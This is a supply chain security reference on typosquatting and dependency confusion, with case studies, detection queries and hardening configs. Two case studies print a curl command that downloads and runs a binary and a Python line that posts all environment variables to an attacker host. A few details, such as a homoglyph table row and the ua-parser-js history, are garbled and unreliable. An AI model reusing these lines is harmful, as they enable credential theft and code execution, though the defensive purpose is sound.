# Attack Technique: Typosquatting in Package Managers
> Supply Chain Security Reference · MITRE T1195.001 · OWASP CICD-SEC-03

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [How the Attack Works](#how-the-attack-works)
3. [Attack Vectors & Taxonomy](#attack-vectors--taxonomy)
4. [Real-World Case Studies](#real-world-case-studies)
5. [Registry-Level Countermeasures](#registry-level-countermeasures)
6. [Threat Hunting & Detection Engineering](#threat-hunting--detection-engineering)
7. [Hardening — Engineering Best Practices](#hardening--engineering-best-practices)
8. [Framework Mapping & References](#framework-mapping--references)
9. [Quick-Reference Cheat Sheet](#quick-reference-cheat-sheet)

---

## Executive Summary

**Typosquatting** is a supply chain attack targeting software developers, DevOps pipelines, and systems administrators. Attackers register malicious package names on public registries — PyPI, npm, RubyGems, NuGet, Cargo — using names that are common misspellings or near-identical lookalikes of widely-used libraries.

The attack exploits **human typographical errors** (fat-finger mistakes) made during rapid terminal entry or configuration file setup. When a developer accidentally references a lookalike name, the package manager implicitly trusts the registry and installs the attacker's code — triggering immediate:

- **Remote Code Execution (RCE)** via `postinstall` / `setup.py` hooks
- **Credential theft** — environment variables, cloud keys, tokens
- **Persistent backdoor** installation on the build environment or developer machine

Unlike zero-days, typosquatting requires **zero technical vulnerability exploitation**. The attack surface is entirely human error.

---

## How the Attack Works

```
Developer types:   pip install reqeusts          ← typo
                                  ↓
Package registry:  resolves → "reqeusts" (attacker's package)
                                  ↓
Malicious code:    executes immediately at install time
                   (setup.py / postinstall script)
                                  ↓
Attacker receives: AWS keys, tokens, reverse shell
```

**Key properties that make this effective:**

| Property | Why it matters |
|---|---|
| Executes at install time | No user interaction beyond `pip install` needed |
| Registry trusts all packages equally | No privilege required to publish |
| Developers work fast | Typos are extremely common under time pressure |
| Package managers are trusted | Security teams rarely monitor install-time execution |

---

## Attack Vectors & Taxonomy

Attackers analyze keyboard layout adjacency, phonetics, and visual similarity to generate high-probability lookalike names. Three primary mechanics account for the vast majority of real-world attacks.

---

### 1. Character Swap (Inversion)

Two adjacent letters are transposed — a natural result of fingers hitting keys slightly out of order at speed.

| Legitimate | Malicious | Registry | Notes |
|---|---|---|---|
| `requests` | `reqeusts` | PyPI | e↔u inversion |
| `matplotlib` | `matploblit` | PyPI | b/l near end |
| `lodash` | `lodsah` | npm | s/a swap |
| `express` | `espress` | npm | e/x inversion |
| `urllib` | `urllbi` | PyPI | lib → lbi |

**Mechanic:** The attacker studies keyboard heatmaps for the target library and prioritizes swaps involving keys that share a physical row.

---

### 2. Character Omission (Missing Characters)

A letter is silently dropped — especially likely with double consonants, complex consonant clusters, or long words where trailing letters are rushed.

| Legitimate | Malicious | Registry | Notes |
|---|---|---|---|
| `express` | `expres` | npm | trailing s dropped |
| `commander` | `comander` | npm | double-m → single |
| `setuptools` | `setuptool` | PyPI | trailing s dropped |
| `tensorflow` | `tensorflw` | PyPI | o omitted |
| `classnames` | `clasnames` | npm | double-s → single |

**Mechanic:** Double-letter packages (`express`, `commander`, `classnames`) are particularly vulnerable because human readers auto-correct doubled letters mentally.

---

### 3. Visual Substitution & Homoglyphs

Characters with near-identical visual appearance are substituted — numbers for letters, permuted suffixes, or lookalike Unicode characters.

| Legitimate | Malicious | Substitution | Registry |
|---|---|---|---|
| `ansible` | `ansibel` | `le` → `el` | PyPI |
| `django` | `dj4ngo` | `a` → `4` | PyPI |
| `crypto` | `crypt0` | `o` → `0` | npm |
| `boto3` | `bot03` | `3` → `3` (unicode) | PyPI |
| `webpack` | `webpaek` | `ck` → `ek` | npm |

**Mechanic:** This category intersects with **homoglyph attacks** — using Unicode characters that render identically to ASCII in most terminals (e.g., Cyrillic `а` vs Latin `a`).

---

### 4. Bonus: Dependency Confusion

A related but distinct technique: an attacker registers a **public** package with the same name as an **internal private** package. The package manager resolves the public registry version, fetching attacker code.

```
Internal: @mycompany/internal-auth   (private registry)
Attacker:  internal-auth              (public PyPI/npm)

Package manager resolves: public version → RCE
```

This differs from typosquatting but shares the same remediation: **private registry mirroring with scoping enforcement**.

---

## Real-World Case Studies

---

### Case 1 — `ua-parser-js` (npm, 2021)

**Impact:** 8M+ weekly downloads. Used by Facebook, Microsoft, Amazon.

**What happened:**  
The attacker published near-identical packages (`ua-parser-js` variations) months in advance to build download counts and appear legitimate. They then compromised the maintainer account and pushed a poisoned version containing:

- A **cryptominer** (XMRig) installed via `postinstall`
- A **credential stealer** targeting Linux/Windows separately

**Execution path:**
```bash
# postinstall script (Linux) — executed silently on npm install
curl http://159.xxx.xxx.xxx/download -o /tmp/.update-notifier
chmod +x /tmp/.update-notifier && /tmp/.update-notifier
```

**Lesson:** Package account compromise + typosquatting is a compound attack. MFA on all npm accounts + version-pinned lockfiles would have blocked this.

---

### Case 2 — `event-stream` (npm, 2018)

**Impact:** 2M weekly downloads. Targeted Bitcoin wallet software specifically.

**What happened:**  
The original maintainer transferred ownership to an unknown contributor. The new owner published a malicious dependency (`flatmap-stream`) that only activated when the consuming application matched a specific internal package name (`copay-dash`) — evading scanners for months.

**Payload activation logic (pseudocode):**
```javascript
// Only decrypts and runs malicious code if
// the consuming project's package.json matches target
if (packageName === 'copay-dash') {
  // exfiltrate wallet private keys
}
```

**Lesson:** Monitor ownership transfers of dependencies. Behavioral sandboxing of packages during CI would have caught the conditional payload activation via network analysis.

---

### Case 3 — `ctx` (PyPI, 2022)

**Impact:** Demonstrated by researcher Nikolai Tschacher. Package had active production users.

**What happened:**  
The researcher registered the abandoned `ctx` package (previously used by real projects) and modified it to **exfiltrate all environment variables** on every `import ctx` statement — not just at install time:

```python
# Injected code in ctx/__init__.py
import os, requests
requests.post('https://attacker.io/collect', data=dict(os.environ))
```

**What was stolen:** `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, and all other ambient env vars in the process.

**Lesson:** Abandon-squatting (claiming abandoned packages) is a real vector. Audit all packages with no commits in 3+ years. Never expose cloud credentials as environment variables in build runners — use a secrets manager with short-lived tokens.

---

### Case 4 — `colourama` / `coloаrama` (PyPI, 2018)

**Impact:** Targeted developer machines specifically.

**What happened:**  
The legitimate package `colorama` (terminal color utility) was typosquatted as `colourama` — exploiting the British English spelling variation. The malicious variant installed a clipboard hijacker that monitored the clipboard for cryptocurrency wallet addresses and silently replaced them with the attacker's wallet.

**Lesson:** Spelling variations across locales (color/colour, organize/organise) are a deliberate attack surface. Use package allowlists in enterprise environments.

---

## Registry-Level Countermeasures

Public package registries deploy multiple layers of defense at the ingestion and distribution layers.

| Defense Mechanism | How It Works | Registry |
|---|---|---|
| **Levenshtein Distance Blocking** | Edit distance calculated between new submissions and top 10K packages. Submissions within 1–2 edits of popular libraries are auto-rejected. | PyPI, npm |
| **Name Canonicalization** | Underscores, hyphens, and case are normalized. `my-package`, `my_package`, `MyPackage` resolve to the same slot — preventing case-variation squatting. | PyPI |
| **Mandatory MFA / 2FA** | Enforced for maintainers of packages with >1M weekly downloads. Blocks account-takeover vectors. | npm (2022+), PyPI (2023+) |
| **Automated Behavioral Scanners** | New packages are detonated in sandboxes. Network connections, env var reads, or shell execution in install scripts trigger quarantine. | PyPI (via Bandit), npm (via Socket.dev partnership) |
| **Ownership Transfer Alerts** | Maintainer changes on high-download packages trigger manual security review. | npm |
| **Sigstore / Trusted Publishing** | Cryptographic attestation links package releases to verifiable CI/CD pipeline runs, preventing supply chain substitution. | PyPI (2023+) |

---

## Threat Hunting & Detection Engineering

### 1. Static Dependency Audits (CI/CD Integration)

Run these tools as mandatory steps in CI pipelines. **Fail the build on any finding.**

```bash
# ── Node.js ──────────────────────────────────────────────────
# Audit full dependency tree against npm advisory database
npm audit --audit-level=moderate

# Deep supply chain analysis (checks for install scripts, typosquats)
npx socket scan .

# ── Python ───────────────────────────────────────────────────
# pip-audit: maintained by the Python Packaging Authority
pip install pip-audit
pip-audit --require-hashes -r requirements.txt

# safety: checks against a curated vulnerability database
pip install safety
safety check -r requirements.txt

# ── Ruby ─────────────────────────────────────────────────────
gem install bundler-audit
bundle-audit check --update

# ── Multi-ecosystem (recommended for enterprise) ──────────────
# Snyk: multi-language, integrates with GitHub/GitLab
snyk test

# Dependabot: GitHub-native automated PR generation for outdated deps
# Configure in .github/dependabot.yml
```

---

### 2. DNS & Proxy Log Threat Hunting Queries

**Hypothesis:** A typosquatted package was installed on a build server and is beaconing to C2 infrastructure.

**Data sources:** DNS resolver logs, proxy/NGFW logs, endpoint EDR telemetry.

**SIEM hunting rule (pseudo-KQL/Splunk):**

```
index=proxy_logs
  sourcetype=dns
  src_ip IN (build_server_subnet)
  NOT dest IN (known_registries)  // registry.npmjs.org, pypi.org, rubygems.org
  earliest=-24h
| where query_count < 5           // low-reputation, rarely queried
| stats count by dest, src_ip
| where count < 10
| sort by count asc
```

**High-signal indicators to hunt for:**

| Indicator | Threshold | Action |
|---|---|---|
| Package published < 72h before install | Any | Quarantine host, review package |
| Package global downloads < 500 | Any in prod | Manual review before use |
| Outbound DNS from build server to unknown host | Any during `npm install` | Isolate + forensic image |
| `setup.py` or `postinstall` spawns shell | Any | Immediate incident response |
| Env var reads followed by HTTP POST | Any | Assume credential exfiltration |

---

### 3. Behavioral Indicators on Endpoints

Use EDR (CrowdStrike, SentinelOne, Defender for Endpoint) to alert on:

```
PARENT: node / python / ruby
  └─ CHILD: curl / wget / bash / sh / powershell
      └─ making outbound connections
         during package install phase
```

This process tree is **never legitimate** during a package install. Any package that spawns a network-connected shell is malicious.

---

## Hardening — Engineering Best Practices

### Principle: Eliminate Reliance on Human Typing Precision

The goal is to make the attack surface **structural** (controlled by config) rather than **behavioral** (dependent on developer accuracy).

---

### 1. Cryptographic Lockfiles (Most Important Control)

Lockfiles pin exact versions **and** cryptographic SHA-256 hashes. Even if the registry is compromised, hash verification will abort the install.

```bash
# npm — always commit package-lock.json
npm install --save-exact some-package
git add package-lock.json

# Python — use poetry or pip with hashes
pip install --require-hashes -r requirements.txt

# Verify hash manually (python)
pip download requests==2.31.0
sha256sum requests-2.31.0-*.whl
# Compare against published hash on PyPI
```

---

### 2. Explicit Version Pinning

```
# ── VULNERABLE ────────────────────────────────────────────────
# Resolves latest at install time → susceptible to malicious updates
requests
lodash

# ── SECURE ────────────────────────────────────────────────────
# Exact version enforced; pair with lockfile for full protection
requests==2.31.0
lodash@4.17.21
```

---

### 3. Private Registry Mirroring

Route all package fetches through an internal registry that allowlists approved packages. Build servers should **never** reach public registries directly.

```ini
# .npmrc — redirect all installs through internal Artifactory/Nexus
registry=https://registry.internal.example.com/npm/
always-auth=true

# pip.conf — enforce corporate PyPI mirror
[global]
index-url = https://pypi.internal.example.com/simple/
trusted-host = pypi.internal.example.com
no-index = false
```

---

### 4. Package Allowlisting (Most Restrictive — Recommended for Production)

Maintain an explicit allowlist of approved packages and block all others at the registry proxy level.

```yaml
# Example Artifactory repository policy
allowed_packages:
  - requests==2.31.0
  - numpy==1.24.0
  - flask==3.0.0
  # ...
block_unknown: true
alert_on_new_package: true
```

---

### 5. Pre-commit & IDE Hooks

Catch typos before they reach the registry:

```bash
# Install a pre-commit hook that checks package names
pip install pre-commit

# .pre-commit-config.yaml
repos:
  - repo: https://github.com/pyupio/safety
    rev: v2.3.5
    hooks:
      - id: safety
```

---

## Framework Mapping & References

### MITRE ATT&CK

| ID | Name | Tactic |
|---|---|---|
| T1195.001 | Supply Chain Compromise: Compromise Software Dependencies | Initial Access |
| T1059 | Command and Scripting Interpreter | Execution (postinstall scripts) |
| T1552.001 | Unsecured Credentials: Credentials in Files | Credential Access |

### OWASP

| ID | Name |
|---|---|
| CICD-SEC-03 | Dependency Chain Abuse |
| A06:2021 | Vulnerable and Outdated Components |

### Further Reading

- [npm Security Advisories](https://www.npmjs.com/advisories)
- [PyPI Security Model](https://docs.pypi.org/security-key-giveaway/)
- [Sigstore — Supply Chain Integrity](https://sigstore.dev)
- [Socket.dev — Real-time Supply Chain Security](https://socket.dev)
- [SLSA Framework — Supply-chain Levels for Software Artifacts](https://slsa.dev)

---

## Quick-Reference Cheat Sheet

```
┌─────────────────────────────────────────────────────────────────┐
│              TYPOSQUATTING — RAPID REFERENCE                    │
├──────────────────────────┬──────────────────────────────────────┤
│ ATTACK VECTORS           │ EXAMPLES                            │
│ Character swap           │ requests → reqeusts                 │
│ Character omission       │ express → expres                    │
│ Visual substitution      │ ansible → ansibel, django → dj4ngo  │
│ Dependency confusion     │ internal-pkg on public registry     │
├──────────────────────────┼──────────────────────────────────────┤
│ DETECTION SIGNALS        │ THRESHOLD                           │
│ Package age              │ < 72h old in production             │
│ Download count           │ < 500 globally                      │
│ Install-time network     │ Any unknown outbound DNS            │
│ Shell spawn from install │ Any — always malicious              │
├──────────────────────────┼──────────────────────────────────────┤
│ TOP CONTROLS             │ PRIORITY                            │
│ Cryptographic lockfiles  │ ★★★★★ (most impactful)             │
│ Exact version pinning    │ ★★★★☆                              │
│ Private registry mirror  │ ★★★★☆                              │
│ Package allowlisting     │ ★★★★☆ (enterprise)                 │
│ npm audit / pip-audit    │ ★★★☆☆ (reactive, not preventive)   │
│ Developer training       │ ★★☆☆☆ (unreliable alone)           │
├──────────────────────────┼──────────────────────────────────────┤
│ MITRE                    │ T1195.001                           │
│ OWASP CI/CD              │ CICD-SEC-03                         │
│ OWASP Top 10             │ A06:2021                            │
└──────────────────────────┴──────────────────────────────────────┘
```

---
